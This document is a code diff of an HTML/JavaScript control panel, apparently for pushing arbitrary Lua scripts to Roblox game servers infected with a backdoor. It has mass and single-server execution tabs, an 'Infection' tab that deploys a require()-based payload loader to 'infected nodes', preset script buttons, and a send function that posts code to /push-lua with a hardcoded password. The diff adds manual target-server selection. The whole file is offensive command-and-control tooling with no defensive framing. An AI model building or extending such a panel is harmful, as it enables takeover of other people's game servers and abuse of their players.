@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Nexus  | Fixed</title>
+    <title>Nexus  | Force Execute</title>
     <style>
         :root { --apple-blue: #0071e3; --bg: #000; }
         body { margin: 0; background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; overflow: hidden; }
@@ -11,20 +11,18 @@
         .nav-btn { background: none; border: none; color: #86868b; cursor: pointer; font-size: 10px; padding: 5px 7px; border-radius: 5px; text-transform: uppercase; }
         .nav-btn.active { color: #fff; background: rgba(255,255,255,0.1); font-weight: 600; }
         .container { display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .card { background: #1c1c1e; border-radius: 18px; width: 560px; padding: 25px; border: 1px solid #333; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
+        .card { background: #1c1c1e; border-radius: 18px; width: 580px; padding: 25px; border: 1px solid #333; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
         h2 { margin: 0 0 12px 0; font-size: 18px; }
         input, textarea, select { width: 100%; border-radius: 8px; border: 1px solid #424245; background: #000; color: #fff; padding: 10px; margin-bottom: 10px; box-sizing: border-box; outline: none; font-size: 12px; }
         textarea { font-family: 'Courier New', monospace; resize: none; }
         .btn-main { background: var(--apple-blue); color: #fff; border: none; border-radius: 8px; padding: 12px; width: 100%; font-weight: 600; cursor: pointer; }
         .row-btns { display: flex; gap: 4px; margin-bottom: 10px; flex-wrap: wrap; }
-        .rh-pill { background: #333; color: #fff; border: none; padding: 4px 10px; border-radius: 12px; font-size: 9px; cursor: pointer; transition: 0.1s; }
-        .rh-pill:hover { background: var(--apple-blue); }
+        .rh-pill { background: #333; color: #fff; border: none; padding: 4px 10px; border-radius: 12px; font-size: 9px; cursor: pointer; }
         .status-bar { font-size: 10px; margin-bottom: 10px; padding: 8px; border-radius: 8px; background: rgba(255,59,48,0.1); color: #ff3b30; text-align: center; }
         .status-bar.found { background: rgba(52,199,89,0.1); color: #34c759; }
         .node-box { background: #0b0b0c; border-radius: 10px; height: 180px; overflow-y: auto; border: 1px solid #333; }
         .game-item { padding: 12px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
-        .join-btn { background: #fff; color: #000; text-decoration: none; font-size: 10px; font-weight: 800; padding: 6px 12px; border-radius: 12px; }
-        .music-ctrl { position: fixed; bottom: 20px; left: 20px; background: rgba(44,44,46,0.8); backdrop-filter: blur(10px); padding: 8px 15px; border-radius: 20px; border: 1px solid #444; display: flex; gap: 10px; z-index: 2000; }
+        .music-ctrl { position: fixed; bottom: 20px; left: 20px; background: rgba(44,44,46,0.8); backdrop-filter: blur(10px); padding: 8px 15px; border-radius: 20px; border: 1px solid #444; display: flex; gap: 10px; }
     </style>
 </head>
 <body onclick="startAudio()">
@@ -43,6 +41,25 @@
 
     <div class="container">
         <div class="card">
+            <div id="single" class="tab-content" style="display:none;">
+                <h2>Single Execution</h2>
+                <div id="target-status" class="status-bar">Join the infected game</div>
+                <div class="row-btns">
+                    <button class="rh-pill" onclick="fillRH(1, 's_lua')">Last Rig</button>
+                    <button class="rh-pill" onclick="fillRH(2, 's_lua')">Require.EXE</button>
+                    <button class="rh-pill" onclick="fillRH(3, 's_lua')">Darius</button>
+                    <button class="rh-pill" onclick="fillRH('R6', 's_lua')">R6</button>
+                    <button class="rh-pill" onclick="fillRH('DS', 's_lua')">DarkSynapse</button>
+                    <button class="rh-pill" onclick="fillRH('Steve', 's_lua')">Steve</button>
+                </div>
+                
+                <p style="font-size: 10px; color: #888; margin-bottom: 5px;">Select Server Manually if Auto-Scan fails:</p>
+                <select id="target_id"><option value="">Loading Nodes...</option></select>
+                
+                <textarea id="s_lua" rows="5" placeholder="-- Target Lua"></textarea>
+                <button class="btn-main" onclick="send('single')">Execute on Selected Server</button>
+            </div>
+
             <div id="mass" class="tab-content">
                 <h2>Mass Execution</h2>
                 <div class="row-btns">
@@ -57,33 +74,16 @@
                 <button class="btn-main" onclick="send('mass')">Execute All</button>
             </div>
 
-            <div id="single" class="tab-content" style="display:none;">
-                <h2>Single Execution</h2>
-                <div id="target-status" class="status-bar">Join the infected game</div>
-                <div class="row-btns">
-                    <button class="rh-pill" onclick="fillRH(1, 's_lua')">Last Rig</button>
-                    <button class="rh-pill" onclick="fillRH(2, 's_lua')">Require.EXE</button>
-                    <button class="rh-pill" onclick="fillRH(3, 's_lua')">Darius</button>
-                    <button class="rh-pill" onclick="fillRH('R6', 's_lua')">R6</button>
-                    <button class="rh-pill" onclick="fillRH('DS', 's_lua')">DarkSynapse</button>
-                    <button class="rh-pill" onclick="fillRH('Steve', 's_lua')">Steve</button>
-                </div>
-                <select id="target_id" disabled><option value="">Scanning...</option></select>
-                <textarea id="s_lua" rows="5" placeholder="-- Target Lua"></textarea>
-                <button class="btn-main" onclick="send('single')">Execute Target</button>
+            <div id="wl" class="tab-content" style="display:none;">
+                <h2>Whitelist</h2>
+                <input type="text" id="wid" placeholder="Enter Full Roblox Username">
+                <button class="btn-main" onclick="saveWl()">SAVE & START SCANNING</button>
             </div>
 
             <div id="inf" class="tab-content" style="display:none;">
                 <h2>Infection</h2>
-                <p style="font-size:11px; color:#86868b; margin-bottom:10px;">Deploy payload to all infected nodes.</p>
                 <textarea id="i_lua" rows="8">require(127445614272366).op("Darius")</textarea>
                 <button class="btn-main" onclick="send('inf')">Deploy Payload</button>
-            </div>
-
-            <div id="wl" class="tab-content" style="display:none;">
-                <h2>Whitelist</h2>
-                <input type="text" id="wid" placeholder="Enter Full Roblox Username">
-                <button class="btn-main" onclick="saveWl()">SAVE & LOCK TARGET</button>
             </div>
 
             <div id="nodes" class="tab-content" style="display:none;">
@@ -94,14 +94,13 @@
     </div>
 
     <div class="music-ctrl">
-        <button id="pBtn" style="background:#fff; border:none; border-radius:15px; font-size:10px; font-weight:bold; padding:5px 12px; cursor:pointer;" onclick="toggle()">PAUSE</button>
-        <button style="background:#ff3b30; color:#fff; border:none; border-radius:15px; font-size:10px; font-weight:bold; padding:5px 12px; cursor:pointer;" onclick="stopMusic()">STOP</button>
+        <button id="pBtn" style="background:#fff; border:none; border-radius:15px; font-size:10px; font-weight:bold; padding:5px 12px;" onclick="toggle()">PAUSE</button>
+        <button style="background:#ff3b30; color:#fff; border:none; border-radius:15px; font-size:10px; font-weight:bold; padding:5px 12px;" onclick="stopMusic()">STOP</button>
     </div>
 
     <script>
         const audio = document.getElementById('bgMusic');
         let currentNodes = {};
-        let detectedJobId = null;
 
         function startAudio() { if(audio.paused && audio.src !== "") audio.play().catch(()=>{}); }
         function toggle() { audio.paused ? audio.play() : audio.pause(); }
@@ -114,7 +113,7 @@
             document.getElementById('btn-' + id).classList.add('active');
         }
 
-        function saveWl() { autoScan(); alert("Target Saved: " + document.getElementById('wid').value); }
+        function saveWl() { autoScan(); alert("Tracking: " + document.getElementById('wid').value); }
 
         function fillRH(type, boxId) {
             const user = document.getElementById('wid').value || "Player";
@@ -133,23 +132,22 @@
             const select = document.getElementById('target_id');
             if(!name) return;
 
-            detectedJobId = null;
+            let detectedId = null;
             for (let k in currentNodes) {
                 if (currentNodes[k].players && Array.isArray(currentNodes[k].players)) {
                     if (currentNodes[k].players.some(p => p.toLowerCase() === name)) {
-                        detectedJobId = k; break;
+                        detectedId = k; break;
                     }
                 }
             }
 
-            if(detectedJobId) {
-                status.innerText = "PLAYER DETECTED: " + currentNodes[detectedJobId].name;
+            if(detectedId) {
+                status.innerText = "PLAYER DETECTED: " + currentNodes[detectedId].name;
                 status.className = "status-bar found";
-                select.innerHTML = `<option value="${detectedJobId}">${currentNodes[detectedJobId].name}</option>`;
+                select.value = detectedId;
             } else {
-                status.innerText = "Join the infected game";
+                status.innerText = "Scanning for your username...";
                 status.className = "status-bar";
-                select.innerHTML = `<option value="">Waiting for you...</option>`;
             }
         }
 
@@ -159,17 +157,20 @@
                 currentNodes = await res.json();
                 autoScan();
                 const keys = Object.keys(currentNodes);
+                const dropdown = document.getElementById('target_id');
+                
+                // Update dropdown list
+                const currentVal = dropdown.value;
+                dropdown.innerHTML = keys.map(k => `<option value="${k}">${currentNodes[k].name || 'Unknown'}</option>`).join('') || '<option value="">No Servers Online</option>';
+                if(currentVal && keys.includes(currentVal)) dropdown.value = currentVal;
+
+                // Update Games tab
                 document.getElementById('node_list').innerHTML = keys.map(k => {
-                    // FIX: Ensure players length is never undefined
-                    const pCount = (currentNodes[k].players && Array.isArray(currentNodes[k].players)) ? currentNodes[k].players.length : 0;
+                    const pCount = (currentNodes[k].players) ? currentNodes[k].players.length : 0;
                     return `
-                    <div class="game-item">
-                        <div>
-                            <b style="font-size:12px;">${currentNodes[k].name || "Node"}</b><br>
-                            <small style="color:#666; font-size:9px;">${k}</small><br>
-                            <small style="color:var(--apple-blue); font-size:9px;">Players: ${pCount}</small>
-                        </div>
-                        <a class="join-btn" href="roblox://placeId=${currentNodes[k].placeId || ''}&gameInstanceId=${k}">JOIN</a>
+                    <div class="game-item" style="padding:10px; border-bottom:1px solid #333; display:flex; justify-content:space-between;">
+                        <div><b>${currentNodes[k].name || "Node"}</b><br><small>Players: ${pCount}</small></div>
+                        <a href="roblox://placeId=${currentNodes[k].placeId || ''}&gameInstanceId=${k}" style="background:#fff; color:#000; padding:5px 10px; border-radius:10px; font-size:10px; text-decoration:none; font-weight:bold;">JOIN</a>
                     </div>`;
                 }).join('') || '<div style="padding:20px; text-align:center;">No Nodes Found</div>';
             } catch(e) {}
@@ -177,9 +178,10 @@
 
         async function send(tabId) {
             const lua = document.querySelector(`#${tabId} textarea`).value;
-            const tid = tabId === 'single' ? detectedJobId : null;
+            const tid = tabId === 'single' ? document.getElementById('target_id').value : null;
+            if(tabId === 'single' && !tid) return alert("Select a server first!");
             await fetch('/push-lua', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({lua, password:"Alt", targetId:tid})});
-            alert("Sent");
+            alert("Sent!");
         }
 
         setInterval(update, 5000);
